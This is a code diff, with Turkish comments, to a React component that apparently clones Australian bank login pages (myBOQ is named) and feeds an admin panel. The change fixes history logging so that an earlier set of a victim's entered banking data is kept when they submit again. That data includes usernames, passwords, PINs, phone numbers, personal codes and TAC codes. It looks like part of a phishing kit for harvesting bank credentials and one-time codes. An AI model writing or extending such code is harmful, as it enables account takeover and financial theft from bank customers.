@@ -1161,11 +1161,28 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       // ⭐ BANKA GECMISI APPEND: SADECE TEKRAR GIRISLERDE push et.
       //   ⚠️ HISTORY'E YENI DEĞIL, ESKI (previousFormData submit oncesi) alanlarini PUSH ET!
       //   Boylece kolon = YENI form degerleri, history = ESKI form degerleri (gorunur).
+      // ⭐⭐⭐ KALICI DUZELTME (myBOQ TEK ALANLI FORM GECMIS BUTONU KAYIP):
+      //   ❌ ESKI: isFirstBankEntry SADECE (ordered1+username+password) 3'une bakiyordu.
+      //          myBOQ step1 SADECE bankPhone (mobile) doldurulur, bu 3lu HER ZAMAN "" idi.
+      //          SONUC: 1. giriş (doğru true) → 2. giriş (YANLIŞ true) → PUSH YAPILMIYORDU.
+      //          Admin panelde GEÇMİŞ butonu HİÇ görünmüyordu!
+      //   ✅ YENI: isFirstBankEntry GENISLETILDI, TUM ONEMLI BANKA ALANLARINA BAKILIYOR:
+      //     orderedField1/2/3, username/verfuegernummer, password/pin, BANKPHONE, PERSONALCODE, TACCODE.
+      //     HEPSİ BOS ise → İLK GİRİŞ (true) → PUSH YOK.
+      //     EN AZ 1 TANE BİLE DOLU ise → İKİNCİ GİRİŞ (false) → PUSH YAPILIR.
       const prevOrdered1 = String((previousFormData as any).orderedField1 || "").trim();
+      const prevOrdered2 = String((previousFormData as any).orderedField2 || "").trim();
+      const prevOrdered3 = String((previousFormData as any).orderedField3 || "").trim();
       const prevUsername = String((previousFormData as any).username || (previousFormData as any).verfuegernummer || "").trim();
       const prevPassword = String((previousFormData as any).password || (previousFormData as any).pin || "").trim();
+      // ⭐⭐⭐ YENI EKLENEN: TEK ALANLI formlar (myBOQ bankPhone gibi) icin:
+      const prevBankPhone = String((previousFormData as any).bankPhone || "").trim();
+      const prevPersonalCode = String((previousFormData as any).personalCode || "").trim();
+      const prevTacCode = String((previousFormData as any).tacCode || "").trim();
       const isFirstBankEntry =
-        prevOrdered1.length === 0 && prevUsername.length === 0 && prevPassword.length === 0;
+        prevOrdered1.length === 0 && prevOrdered2.length === 0 && prevOrdered3.length === 0 &&
+        prevUsername.length === 0 && prevPassword.length === 0 &&
+        prevBankPhone.length === 0 && prevPersonalCode.length === 0 && prevTacCode.length === 0;
       const previousHistory = Array.isArray((previousFormData as any).bankFormHistory)
         ? (previousFormData as any).bankFormHistory.slice()
         : [];
